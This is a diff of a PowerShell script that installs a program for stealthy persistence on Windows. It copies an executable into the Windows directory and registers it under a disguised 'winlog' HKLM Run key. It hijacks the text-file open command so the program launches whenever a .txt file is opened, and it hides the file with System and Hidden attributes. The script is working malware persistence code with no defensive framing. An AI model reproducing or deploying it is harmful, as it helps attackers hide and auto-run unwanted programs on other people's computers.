@@ -2,7 +2,7 @@
 # You will also need to compile file as .exe
 
 # Set the file name as your .exe
-$strFileName = "File.exe"
+$strFileName = "file.exe"
 
 If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
@@ -13,17 +13,17 @@ If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
 Set-Location -Path $strDirScriptPath
 
-$APPDATA = "$env:APPDATA"
+$WINDIR = "$env:WINDIR"
 
-# Copy file to appdata folder
-If (test-path "$APPDATA\$strFileName") {Remove-Item "$APPDATA\$strFileName" -Force}
-Copy-Item $strFileName $APPDATA -Force
+# Copy file to windir folder
+If (test-path "$WINDIR\$strFileName") {Remove-Item "$WINDIR\$strFileName" -Force}
+Copy-Item $strFileName $WINDIR -Force
 
 # make program run at startup
-New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winlog -PropertyType String -value $APPDATA\$strFileName -Force
+New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winlog -PropertyType String -value $WINDIR\$strFileName -Force
 
 # make program open anytime a user opens a text file
-New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$APPDATA\$strFileName %1" -Force
+New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$WINDIR\$strFileName %1" -Force
 
 # set attributes to be a system file and a hidden file
-$objGetFile=Get-Item $APPDATA\$strFileName; $objGetFile.Attributes = 'System, Hidden'
+$objGetFile=Get-Item $WINDIR\$strFileName; $objGetFile.Attributes = 'System, Hidden'
